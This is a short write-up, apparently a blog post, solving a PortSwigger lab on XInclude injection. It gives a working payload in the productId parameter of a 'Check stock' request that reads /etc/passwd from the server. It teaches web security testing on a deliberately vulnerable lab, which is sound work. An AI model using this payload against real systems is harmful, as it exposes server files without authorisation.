# Exploiting XInclude to retrieve files

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/lab-xinclude-attack), you'll learn: Exploiting XInclude to retrieve files! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-7/images/Pasted%20image%2020221225065919.png)

In previous labs, we found that **there is an XXE vulnerability in the "Check stock" feature.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-7/images/Pasted%20image%2020221225070033.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-7/images/Pasted%20image%2020221225070047.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-7/images/Pasted%20image%2020221225070535.png)

This time however, we don't see any XML data.

Now, in some applications, they will **receive client-submitted data, embed it on the server-side into an XML document**, and then parse the document.

If the user input is not sanitized very well, it might vulnerable to XXE injection, but using **`XInclude`**.

`XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

**To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Armed with above information, we can send the above payload:**
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

> Note: The payload needs to be URL encoded.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-7/images/Pasted%20image%2020221225070724.png)

We got it!

# What we've learned:

1. Exploiting XInclude to retrieve files